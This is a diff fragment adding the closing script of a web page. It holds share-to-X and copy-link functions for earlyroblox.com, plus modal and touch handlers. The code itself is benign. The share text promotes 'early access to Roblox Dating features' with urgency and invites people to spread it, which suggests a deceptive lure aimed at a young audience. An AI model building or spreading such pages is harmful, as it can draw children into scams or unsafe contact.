+            const text = encodeURIComponent("Just applied for early access to Roblox Dating features! Join me before spots fill up: ");
+            window.open(`https://x.com/intent/tweet?text=${text}&url=${url}`, '_blank');
+        }
+        
+        function copyLink() {
+            const url = "https://earlyroblox.com";
+            navigator.clipboard.writeText(url).then(() => {
+                alert("Link copied to clipboard! Share it with your friends.");
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+        
+        window.addEventListener('click', function(event) {
+            const modal = document.getElementById('tutorialModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        });
+        
+        // Mobile touch improvements
+        document.addEventListener('touchstart', function() {}, { passive: true });
+        document.addEventListener('touchmove', function() {}, { passive: true });
+        
+        // Prevent double-tap zoom
+        document.addEventListener('dblclick', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+    </script>
 </body>
 </html>
